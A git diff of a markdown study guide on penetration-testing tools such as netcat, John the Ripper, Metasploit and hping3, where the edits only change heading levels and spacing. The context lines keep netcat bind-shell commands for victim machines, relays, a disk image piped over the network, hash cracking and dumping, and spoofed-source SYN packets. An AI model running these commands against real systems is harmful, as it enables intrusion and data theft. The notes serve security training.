@@ -4,7 +4,7 @@
 
 Demonstrate competence with common tools including netcat, SSH, Ettercap, p0f, etc...
 
-### netcat
+## netcat
 
 netcat options:
 
@@ -20,6 +20,7 @@ netcat options:
 -e cmd    Execute cmd and pipe netcat IO to program via stdin/stdout.
 -z        When in client mode, emit packets with no payload.
 
+### netcat Examples
 
 Setting up a Listener:
 
@@ -81,7 +82,7 @@ Run listening shell on Windows (victim):
 nc -l -p 54321 -e cmd.exe
 ```
 
-#### Create a FIFO named pipe on Linux (attacker) #1:
+### Create a FIFO named pipe on Linux (attacker) #1:
 
 ```
 mknod backpipe p
@@ -98,60 +99,70 @@ Open new terminal on Linux (attacker) and run netcat to connect to the relay:
 ```
 nc 127.0.0.1 11111
 ```
-#### Create a TCP Backpipe #2:
+
+### Create a TCP Backpipe #2:
 
 Create a Named Pipe
+
 ```
 mknod backpipe /tmp/ncpipe
 ```
 
 Create an NC relay which forwards the data from the listen service, to the target system.
+
 ```
 nc -l -p <port> 0<backpipe | nc <TargetIP> <port> | tee backpipe
 ```
+
 The backpipe in this instance (/tmp/ncpipe) is the location where data is stored and fed back into the pipe. Essentially completing a return loop!
 
-#### TCP Tunnel
+### TCP Tunnel
+
 ```
 echo nc <Target IP> <port> > relay.bat
 nc -l -p <port> -e relay.bat
 ```
 
-#### Remote Shell
+### Remote Shell
+
 ```
 nc -l -p <port> -e /bin/bash
 nc -l -p <port> -e cmd.exe
 ```
 
-#### Port Scanning
+### Port Scanning
+
 ```
 nc -v -n -z -w1 -r <Target IP> <portstart>-<portend>
 ```
 
-#### Banner Grab
+### Banner Grab
+
 ```
 echo "" | nc -v -n -w1 =r <Target IP> <portstart>-<portend>
 ```
 
-#### Makeshift Webserver
+### Makeshift Webserver
+
 ```
 while true; do nc -l -p 80 (or 443) -q 1 < maintenance.html; done
 ```
 You have to actually have made a Maintenance file for this to work
 
-#### Remote Partition
+### Remote Partition
+
 ```
 dd if=/dev/sdc | nc <Target IP> <port>
 nc -l -p <port> | dd of=/tmp/sdc.img
 ```
 
-### SSH
+## SSH
 
-### Ettercap
+## Ettercap
 
-### p0f
+## p0f
 
-### John the Ripper
+## John the Ripper
 
 John the Ripper is essentially a password cracking tool.  You can utilize John the Ripper to perform password cracking once you've retrieved password hashes from a target.
 
@@ -167,11 +178,11 @@ Running John is trival:
 ./john /tmp/combined
 ```
 
-### Cain & Abel
+## Cain & Abel
 
 Cain & Abel is an auditing tool that can be used for testing the strength of passwords on Windows machines.
 
-### Metasploit
+## Metasploit
 
 Starting Metasploit:
 
@@ -259,7 +270,7 @@ hashdump
 run hashdump
 ```
 
-### Volatility
+## Volatility
 
 Getting usage and help:
 
@@ -286,7 +297,7 @@ Determine command-line invocations:
 python vol.py dlllist -p [PID] -f /path/to/memory/dump/mem.dd --profile=Win7SP0x86
 ```
 
-### Hping3
+## Hping3
 
 Hping3 is a command-line packet analyzer that supports the TCP, UDP, ICMP, and RAW-IP protocols.
 
@@ -306,11 +317,11 @@ Running hping3 with TCP SYN flags and a spoofed source address:
 hping3 [IP Address] -a [spoofed IP] -S
 ```
 
-### Dumpsec
+## Dumpsec
 
 Dumpsec gathers information about a remote host without providing valid authentication; you gain info on registry, file system, and printers; users and groups; policies, rights, and services.
 
-### gpg
+## gpg
 
 gpg is an Encryption and Signing Tool. It can be used to encrypt, decrypt, and generate signatures for documents and emails.
 
